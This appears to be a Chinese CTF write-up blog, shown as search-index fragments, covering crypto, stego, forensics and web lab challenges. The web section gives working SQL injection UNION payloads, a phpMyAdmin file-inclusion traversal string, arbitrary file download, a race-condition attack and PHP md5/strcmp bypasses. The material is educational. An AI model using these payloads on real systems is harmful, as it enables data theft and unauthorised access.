","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:5:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x05 细心的大象 在属性里面发现一段base64，解密得到MSDS456ASD123zz。 binwalk发现图片内部有rar压缩包文件，foremost出来，用刚刚的密码解压，得到一张图片，更改高度后，拿到flag。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:6:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x06 被攻破的后台 access.log是Apache的日志文件，打开能够看到黑客使用 head方式进行了目录扫描。 黑客发现了管理员后台页面，对 admin.php 进行暴力破解。 如果爆破成功并且登录，那么会302跳转到后台，所以我们搜索 302 状态码。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:7:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x07 木册木兰 木册木兰指的应该就是栅栏密码，txt中密文为fsf5lrdwacloggwqi11l，在线解密。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:8:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x08 SSCTF签到题 首先得到一串base64编码Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==，解密得到ggQ@gQ1fqh0ohtjpt_sw{gfhgs#}，猜测为栅栏密码，7栏时解得ggqht{ggQht_gsQ10jsf#@fopwh}，再经过凯撒密码解密，得到ssctf{ssCtf_seC10ver#@rabit}。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:9:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x09 base_not_only_64 根据题目可知，是base家族的解密。 4B46445759534B51494E34444F5443464E42555555564A5A504A49464B564A4C4D495A5643364B534E4A344847574B444E5243413D3D3D3D base16decode: KFDWYSKQIN4DOTCFNBUUUVJZPJIFKVJLMIZVC6KSNJ4HGWKDNRCA==== base32decode: QGlIPCx7LEhiJU9zPUU+b3QyRjxsYClD base64decode: @iH\u003c,{,Hb%Os=E\u003eot2F\u003cl`)C base91decode: flag{base_n0t_3asy} ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:10:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0A 手机热点 题目中说明手机共享，通过协议分级统计可知，用到了蓝牙。 搜索flag字符串，发现异常流量。 导出分组字节流，解压得到gif。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:11:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0B 百里挑一 搜索flag字符串，得到一半。 追踪流，查找}，得到后一半。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:12:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0C 冬马和纱 用010打开，搜索FFD9文件尾，发现大片空白区域，下端以FFFB的MP3格式开头，导出，能够正常播放，联想到属性里的单词，猜测是mp3加密。 利用MP3stego来解密。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:13:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0D ping? 发现icmp的Data字段是由26字母顺序重复组成的，且长度不同，和之前做过的第三届“百越杯”福建省高校网络空间安全大赛的题目很相似，数出长度，编写脚本。 a=[102,108,97,103,123,118,101,114,121,103,111,111,100,125]\rflag= ''\rfor i in a:\rflag=flag+chr(i)\rprint(flag)\r","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:14:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0E 快！快！快！ 脚本如下： import hashlib Q1=103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521 Q2=151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743 Q=168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651 c=pow(Q1,Q2,Q) md5_c= hashlib.md5() md5_c.update(hex(c)) print md5_c.hexdigest() ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:15:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x0F rsarsa 脚本如下： from Crypto.Util.number import * p=9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c=83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 d=inverse(e,(p-1)*(q-1)) n=p*q m=pow(c,d,n) print (m) ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:16:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x10 you_raise_me_up 分析代码得到各个参数之间的关系，c=m\u003csup\u003ebyte_to_long(flag)\u003c/sup\u003emod n。求解flag需要用到离散对数，byte_to_long(flag)=log\u003csub\u003e(m mod n)\u003c/sub\u003e(c mod n)，导入sympy库，求离散对数的函数（如7\u003csup\u003e3\u003c/sup\u003e\u003cem\u003emod\u003c/em\u003e15=41）：discrete_log(41,15,7) from sympy.ntheory import discrete_log from Crypto.Util.number import * n =2**512 m=391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075 c=6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499 flag = discrete_log(n,c,m) print long_to_bytes(flag) ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:17:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":["WriteUp"],"content":"0x00 前言 菜狗想打CTF。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:1:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x01 hash attack 进入环境，给出了代码。 \u003c?php echo \"已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9,想要扩展的字符串是joychou\".\"\u003cbr\u003e\"; $flag = \"**********\"; $role = $_REQUEST[\"role\"]; $hash = $_REQUEST[\"hash\"]; $salt = \"***********\"; //The length is 4 if ($hash !== md5($salt.$role)){ echo 'wrong!'; exit; } if ( $role == 'admin'){ echo 'no no no !, hash cann\\'t be admin'; exit; } //echo \"You are \".$role.'\u003c/br\u003e'; echo 'Congradulation! The flag is'.$flag; ?\u003e wrong! 先把hash值解一下，得到memeadmin,salt的值应该就是meme，想要扩展的字符串是joychou，构造role=adminjoychou，在填上salt，进行md5加密，得到189a928b5a79d07b96d464fb188eddc1，在HackBar上构造url，成功拿到flag。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:2:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x02 后台管理系统 现在SKCTF管理系统注册一个用户，登录出现提示。 在注册页面注册admin，提示如下： 可以得到管理员的用户名为admin，这里需要用到sql约束攻击，数据库建表时约束了字段的长度，例如username如果约束长度是2的话，输入超长的长度是只会保留约束长度的。构造一个用户名为admin 且密码符合规范的用户，数据库只会存入admin，相当于存入了一个与admin的同名用户，而密码则是我们注册时所设定的密码。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:3:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x03 成绩单 一看就知道是sql注入，1' order by 4#时能够正常显示，1' order by 5#时无法显示，得出列数为4，下面猜解数据库名，输入-1' union select 1,database(),3,4#，成功得到web1。 再来猜解表名，输入-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4#，得到fl4g。 根据fl4g表来查询列名，输入-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='fl4g'),3,4#。 取出flag的值，输入-1' union select 1,(select flag from fl4g),3,4# ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:4:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x04 这里有几首歌 先把两首歌下载到本地进行音频分析，没有什么异常。 分析源代码发现下载链接为download.php?url=目标文件的base64编码，可以利用此漏洞进行任意文件下载。 download.php的base64编码为ZG93bmxvYWQucGhw，尝试下载分析源码，发现了好东西。 hereiskey.php的base64加密为aGVyZWlza2V5LnBocA==，下载到本地，得到flag。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:5:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x05 warmup 有个hint，点开后发现了有意思的东西，想到phpmyadmin 4.8.1任意文件包含漏洞，通过目录穿越包含任意文件，在url后添加%253f/../../../../../../../../../ffffllllaaaagggg。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:6:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x06 shop 题目购买flag需要21元，可是余额只有20元，因此使用条件竞争购买，抓包，发送到intrude，清空变量，设置payload为Null payload ，发包数量为10000，线程数为25，开始攻击。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:7:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x07 前女友 点开链接，得到 \u003c?php\rif(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){\r$v1 = $_GET['v1'];\r$v2 = $_GET['v2'];\r$v3 = $_GET['v3'];\rif($v1 != $v2 \u0026\u0026 md5($v1) == md5($v2)){\rif(!strcmp($v3, $flag)){\recho $flag;\r}\r}\r}\r?\u003e\r构造三个参数，v1和v2利用md5函数的特性，使用一个不可md5的数据类型传入的话那么md5函数将返回false,可以用两个值不同但不可md5的数据类型，v3利用strcmp函数的特性，如果出错，那么返回值是0，和字符串相等时返回值一致。构造?v1[]=1\u0026v2[]=2\u0026v3[]=3。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:8:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x08 uploading 分析代码，name和password可以利用sha1的特性，使用不可处理的数据类型来绕过，设置payload为：?name[]=1\u0026password[]=2\u0026file=upload.php 又得到一片代码，展现了过滤的规则。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:9:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"0x09 排好队 绕过去 题目就是md5(uname)===md5(passwd)，这里直接上数值就完事了，?uname[]=1\u0026passwd[]=2。 ","date":"2021-02-13","objectID":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/:10:0","tags":["Web安全","CTF"],"title":"凌虚平台CTF训练营（Web）","uri":"/2021-02-13-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5web/"},{"categories":["WriteUp"],"content":"\r","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:0:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x00 签到 点开视频即可。 ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:1:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x01 牛年大吉 右键点击属性。 ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:2:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x02 Flag不在这 010editor打开文件，搜索flag字符串。 ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:3:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x03 拼图 根据鬼刀找到原图，不会用工具，但图片数量不多，而且比较清晰，这里直接对照原图，简单拼一下。 ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:4:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x04 网络深处 拨号音.wav，想到DTMF，找工具解码得到15975384265，这个就是压缩包的密码，解压后把电话录音.wav导入Audacity分析，转频谱图发现如下信息： 百度可知tupper是自引用公式，也叫Tupper自我指涉公式，此公式的二维图像与公式本身外观一样，根据一个式子，在坐标图上显现出所要表达的东西。 from PIL import Image k1=636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871 # Assign k1,k2, k3 to k to get desired image k = k1 width = 106 height = 17 scale = 5 fname = \"foo\" image = Image.new(\"RGB\", (width, height),(255, 255, 255)) for x in range (width): for y in range (height): if ((k+y)//17//2**(17*int(x)+int(y)%17))%2 \u003e 0.5: # Image need to be flipped vertically - therefore y = height-y-1 image.putpixel((x, height-y-1), (0,0,0)) #scale up image image = image.resize((width*scale,height*scale)) image.save(fname+\".png\") ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:5:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x05 YLBNB 先wireshark分析，追踪tcp流，发现xor.py代码，里面有YLB字样，猜测有用。 继续往下看，在tcp.stream eq 17时，用户POST了一个secret.cpython-38.pyc，同样带有YLB的字样。 导出pyc，在https://tool.lu/pyc/反编译。 用户POST了一个YLBSB.zip，提取出来，解压得到YLBSB.xor。 编写解密脚本。 import base64\rkey = \"YLBSB?YLBNB!\"\rfile =open(\"YLBSB.docx\", \"wb\")\renc =open(\"YLBSB.xor\", \"rb\")\rplain = enc.read().decode()\rcount = 0\rd =''\rfor i in plain:\ra = chr(ord(i) ^ ord(key[count % len(key)]))\rd = d + a\rcount = count + 1\rfile.write(base64.b64decode(d))\r发现Word文档存在异常。 猜测文字白色，调颜色为黑色。 ","date":"2021-02-09","objectID":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/:6:0","tags":["CTF"],"title":"SXC 部分WriteUp","uri":"/2021-02-09-sxc-%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"\r0x00 前言 从易到难的Misc大汇总，包含了很多常见的考点。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:0:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x01 属性.jpg 右键搞定 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:1:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x02 string.jpg 应该是考察strings命令，这里直接010打开，搜索Nep。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:2:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x03 grep.jpg 应该是考察strings命令和grep的配合，上面同样的套路再来一遍。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:3:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x04 aaa.gif 明显看到GIF里插入了一张红色的图，Stegsolve逐帧分析。 flag{he11ohongke},但提交错误，有点儿懵。。 多次尝试后发现是flag{hello hongke} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:4:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x05 lsb.jpg stegslove查看lsb隐写，发现藏有图片，另存一下。 得到一个二维码，扫一下。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:5:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x06 binwalk,foremost,dd.png 从名字可知要用到binwalk,foremost命令 分离出图片 flag{Nepnep} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:6:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x07 上课认真听了吗？ 先追踪udp流，得到flag{254}，再追踪http流。 得到flag{340}，追踪tcp流，在tcp.stream eq 22时，得到另一部分flag{26}。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:7:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x08 pngcheck.png 先用png看一看，检查图片结构是否存在问题，发现在IDAT异常。 用代码解压一下。 import zlib\rs = '''\r78 9C 4B CB 49 4C AF 4E 4B 36 32 4D 4E 4A 32 4F\rB2 30 B5 34 B5 4C 4B 35 30 36 37 B6 30 32 31 4C\rB4 34 4B 4A 33 32 4E A9 05 00 E9 E2 0B 5F D0 1C\r68\r'''\rs = s.replace(' ','').replace('\\n','')\rb = bytes.fromhex(s)\rflag = zlib.decompress(b)\rprint(flag)\rflag{fc25cbb7b85959fe03738241a96bf23d} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:8:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x09 westego4.3open (123456).bmp 使用wbs43open工具，输入密码。 得到flag{我跟你讲，这个小甜瓜超甜der~} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:9:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0A IHDR.png IHDR块不对劲，CRC校验有问题。 import os\rimport binascii\rimport struct\rpng= open(\"IHDR.png\",\"rb\").read()\rfor i in range(1024):\rdata = png[12:20] + struct.pack('\u003ei',i)+png[24:29]\rcrc32 = binascii.crc32(data) \u0026 0xffffffff\rif crc32 == 